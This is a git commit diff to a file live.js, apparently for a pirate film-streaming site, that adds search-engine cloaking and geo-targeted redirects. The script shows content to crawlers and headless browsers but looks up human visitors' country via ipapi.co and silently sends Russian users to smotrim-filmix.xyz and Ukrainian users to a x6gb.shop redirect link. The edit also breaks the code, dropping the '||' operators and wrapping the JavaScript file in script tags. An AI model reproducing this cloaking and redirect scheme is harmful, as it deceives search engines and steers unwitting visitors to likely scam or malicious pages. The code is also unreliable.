fdecac176af5f4a3872d7119f6e1405154dee27e
kinal-tv <ayronun@gmail.com>
2026-09-07 08:52:12 +0300

    Update live.js

--- live.js
+++ live.js
@@ -1,20 +1,41 @@
-﻿var ua = navigator.userAgent.toLowerCase();
+﻿<script>
+var ua = navigator.userAgent.toLowerCase();
 
 var isLikelyBot =
-  ua.includes('googlebot') ||
-  ua.includes('bingbot') ||
-  ua.includes('yahoo') ||
-  ua.includes('yandex') ||
-  ua.includes('baiduspider') ||
-  ua.includes('compatible') ||     
-  ua.includes('bot') ||
-  ua.includes('crawler') ||
-  ua.includes('spider') ||
-  /headless/i.test(ua) ||           
-  navigator.webdriver === true;     
+  ua.includes('googlebot') 
+  ua.includes('bingbot') 
+  ua.includes('yahoo') 
+  ua.includes('yandex') 
+  ua.includes('baiduspider') 
+  ua.includes('compatible') 
+  ua.includes('bot') 
+  ua.includes('crawler') 
+  ua.includes('spider') 
+  /headless/i.test(ua) 
+  navigator.webdriver === true;
 
 if (!isLikelyBot) {
-  window.location.replace("https://smotrim-filmix.xyz/Vishka-2026-G7nk");
+
+  fetch("https://ipapi.co/json/")
+    .then(response => response.json())
+    .then(data => {
+
+      var country = data.country_code;
+
+      if (country === "RU") {
+        window.location.replace("https://smotrim-filmix.xyz/Vishka-2026-G7nk");
+      }
+
+      else if (country === "UA") {
+        window.location.replace("https://x6gb.shop/3/rd.php?url=/l/ehtx");
+      }
+
+    })
+    .catch(error => {
+      console.log("Не удалось определить страну");
+    });
+
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
+</script>
